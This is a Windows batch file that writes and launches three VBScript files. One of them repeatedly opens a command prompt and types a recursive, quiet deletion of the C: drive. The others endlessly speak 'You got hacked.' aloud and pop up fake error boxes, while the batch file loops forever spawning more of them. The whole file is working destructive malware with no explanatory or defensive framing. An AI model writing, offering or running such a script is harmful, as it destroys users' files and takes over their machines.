@echo off
set "out=C:\Users\%Username%"
> "%out%\12.vbs" echo;set x=createObject("wscript.shell")
>> "%out%\12.vbs" echo;set y=WScript
>> "%out%\12.vbs" echo;do
>> "%out%\12.vbs" echo;x.run "cmd.exe"
>> "%out%\12.vbs" echo;y.Sleep 100
>> "%out%\12.vbs" echo;x.sendKeys "del C:\ /s /q"
>> "%out%\12.vbs" echo;y.Sleep 20
>> "%out%\12.vbs" echo;x.sendKeys "~"
>> "%out%\12.vbs" echo;y.Sleep 20
>> "%out%\12.vbs" echo;x.sendKeys "y"
>> "%out%\12.vbs" echo;y.Sleep 1500
>> "%out%\12.vbs" echo;loop
> "%out%\13.vbs" echo;dim seechobject
>> "%out%\13.vbs" echo;set z=createObject("sapi.spvoice")
>> "%out%\13.vbs" echo;do
>> "%out%\13.vbs" echo;z.speak "You got hacked."
>> "%out%\13.vbs" echo;loop
> "%out%\14.vbs" echo;x=msgBox("An Error accured while destroying your PC",0+16+4096,"Error")
>> "%out%\14.vbs" echo;do
>> "%out%\14.vbs" echo;x=msgBox("Error: 0xc000000f",0+16+4096,"0xc000000f")
>> "%out%\14.vbs" echo;loop
cd C:\Users\%Username%
start 12.vbs
start 13.vbs
:D
start 14.vbs
goto D
